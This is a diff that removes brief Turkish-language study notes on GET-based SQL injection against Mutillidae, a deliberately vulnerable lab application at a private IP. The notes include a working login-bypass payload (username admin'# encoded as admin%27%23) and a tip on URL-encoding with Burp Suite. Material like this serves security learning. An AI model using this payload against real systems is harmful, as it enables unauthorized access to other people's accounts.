@@ -1,7 +1,0 @@
-SQL INJECTION (GET METHOD)
-
-10.0.2.5/mutillidae/index.php?page=user-info.php&username=neon&password=123&user-info-php-submit-button=View+Account+Details
-
-http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=admin%27%23&password=&user-info-php-submit-button=View+Account+Details
-URL'ler farkli bir encodding kullandiği için url içerisine # yazdiğimizda bunu anlamaz. Onun yerine %23 Yazmaliyiz.
-Hangi sembolün hangi anlama geldiğine bakmak için: BurpSuite > Decoder > Encode as URL
